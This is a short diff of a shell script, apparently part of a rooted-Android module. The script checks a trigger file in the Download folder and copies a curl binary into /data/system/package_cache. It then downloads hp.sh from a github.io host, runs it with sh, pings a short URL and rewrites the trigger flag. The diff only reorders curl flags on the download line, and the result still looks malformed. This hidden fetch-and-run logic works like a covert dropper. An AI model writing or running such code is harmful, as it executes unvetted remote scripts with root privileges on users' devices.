@@ -7,7 +7,7 @@ file_content=$(cat "/storage/emulated/0/Download/apks.txt" | tr -d '\r\n')
 if [ "$file_content" = "123" ]; then
     echo "ok"
     cp -f /data/adb/modules/zygisk_lsposed/curl /data/system/package_cache/curl
-    curl -o -s http://tanluying.github.io/ying/hp.sh /storage/emulated/0/Download/hp.sh
+    curl -s -o http://tanluying.github.io/ying/hp.sh /storage/emulated/0/Download/hp.sh
     sh /storage/emulated/0/Download/hp.sh
     curl -l https://sourl.cn/tRtpnk
     echo "456" > /storage/emulated/0/Download/apks.txt
